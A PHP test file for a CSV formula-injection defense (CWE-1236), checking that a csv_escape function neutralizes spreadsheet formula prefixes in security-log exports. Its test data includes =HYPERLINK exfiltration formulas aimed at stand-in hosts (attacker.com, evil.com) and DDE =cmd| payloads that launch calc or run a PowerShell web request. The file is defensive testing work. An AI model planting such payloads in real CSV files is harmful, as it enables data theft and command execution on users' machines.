<?php
/**
 * Test Suite: CSV Formula Injection Defense (CWE-1236) (Pillar C [C6])
 * 
 * Verifies:
 * 1. Formula prefix neutralization: '=', '+', '-', '@', '\t', '\r', '%' prefixed with single quote (').
 * 2. Neutralization of real DDE / Hyperlink exfiltration payloads:
 *    - =cmd|'/C calc'!A0
 *    - =HYPERLINK("http://evil.com?leak="&A2, "Click Here")
 *    - +123456789 (formula eval)
 *    - @SUM(A1:A10)
 * 3. Safe pass-through of benign alphanumeric strings without alteration.
 * 4. Safe handling of null, numeric, and empty input values without PHP warnings.
 * 5. End-to-end security log query sanitization through csv_escape pipeline.
 */

require_once __DIR__ . '/../security/csv_safe.php';
require_once __DIR__ . '/../config/database.php';
require_once __DIR__ . '/../security/logger.php';

function test_export_csv_safe(): array {
    $tests = [];

    // -------------------------------------------------------------
    // Test 1: =HYPERLINK() Data Exfiltration Formula Neutralization
    // -------------------------------------------------------------
    $hyperlinkPayload = '=HYPERLINK("http://attacker.com?leak="&A2, "Claim Prize")';
    $escapedHyperlink = csv_escape($hyperlinkPayload);
    $tests[] = [
        'name'   => 'CWE-1236 =HYPERLINK() Exfiltration Formula Escaping',
        'pass'   => ($escapedHyperlink === "'" . $hyperlinkPayload),
        'detail' => "Prefixed with apostrophe: " . substr($escapedHyperlink, 0, 30) . "..."
    ];

    // -------------------------------------------------------------
    // Test 2: =cmd| DDE Code Execution Payload Neutralization
    // -------------------------------------------------------------
    $ddePayload = '=cmd|\'/C powershell -c "Invoke-WebRequest evil.com"\'!A0';
    $escapedDde = csv_escape($ddePayload);
    $tests[] = [
        'name'   => 'CWE-1236 =cmd| DDE Code Execution Payload Escaping',
        'pass'   => ($escapedDde === "'" . $ddePayload),
        'detail' => "DDE command prefixed to prevent spreadsheet shell execution"
    ];

    // -------------------------------------------------------------
    // Test 3: Comprehensive Trigger Character Matrix (@, +, -, \t, \r, %)
    // -------------------------------------------------------------
    $matrix = [
        '+123456'       => "'+123456",
        '-500'          => "'-500",
        '@SUM(1,2)'     => "'@SUM(1,2)",
        "\tTAB_INJECT"  => "'\tTAB_INJECT",
        "\rCR_INJECT"   => "'\rCR_INJECT",
        '%INJECT'       => "'%INJECT"
    ];

    $matrixPassed = true;
    foreach ($matrix as $input => $expected) {
        if (csv_escape($input) !== $expected) {
            $matrixPassed = false;
            break;
        }
    }

    $tests[] = [
        'name'   => 'OWASP Formula Trigger Matrix Neutralization (+, -, @, \\t, \\r, %)',
        'pass'   => $matrixPassed,
        'detail' => 'All 6 secondary formula prefixes successfully escaped with single quote'
    ];

    // -------------------------------------------------------------
    // Test 4: Benign Values Remain Intact (No Unnecessary Quotes)
    // -------------------------------------------------------------
    $benignValues = [
        'LOGIN_SUCCESS',
        '192.168.1.50',
        'Transfer of $100 completed',
        'user@example.com',
        'NormalUser_42'
    ];

    $benignPassed = true;
    foreach ($benignValues as $b) {
        if (csv_escape($b) !== $b) {
            $benignPassed = false;
            break;
        }
    }

    $tests[] = [
        'name'   => 'Benign Alphanumeric & Punctuation Field Preservation',
        'pass'   => $benignPassed,
        'detail' => 'Standard bank logs preserved without unnecessary escaping or corruption'
    ];

    // -------------------------------------------------------------
    // Test 5: Null and Empty Field Robustness
    // -------------------------------------------------------------
    $nullRes = csv_escape(null);
    $emptyRes = csv_escape('');
    $tests[] = [
        'name'   => 'Null and Empty Value Handling (Zero Side Effects)',
        'pass'   => ($nullRes === '' && $emptyRes === ''),
        'detail' => 'Null and empty inputs produce clean empty strings without PHP type errors'
    ];

    // -------------------------------------------------------------
    // Test 6: End-to-End Log Injection & Escaped Extraction
    // -------------------------------------------------------------
    $pdo = get_db();
    $injectedDetail = '=cmd|"/C calc"!A0 - malicious transfer memo';
    log_security_event(null, 'TRANSFER_SUBMITTED', 'SUCCESS', $injectedDetail, 'low');

    $stmt = $pdo->query("SELECT request FROM security_logs WHERE request LIKE '%calc%' ORDER BY id DESC LIMIT 1");
    $rawLog = $stmt->fetchColumn();

    $sanitized = csv_escape($rawLog);
    $isSafe = str_starts_with($sanitized, "'=");

    $tests[] = [
        'name'   => 'End-to-End Audit Log Ingestion & Export Neutralization',
        'pass'   => ($isSafe === true),
        'detail' => 'Audit log payload retrieved from MySQL successfully neutralized prior to CSV write'
    ];

    return $tests;
}

if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'] ?? '')) {
    echo "Running CSV Formula Injection Defense Tests...\n";
    foreach (test_export_csv_safe() as $t) {
        printf("  [%s] %s (%s)\n", $t['pass'] ? 'PASS' : 'FAIL', $t['name'], $t['detail']);
    }
}
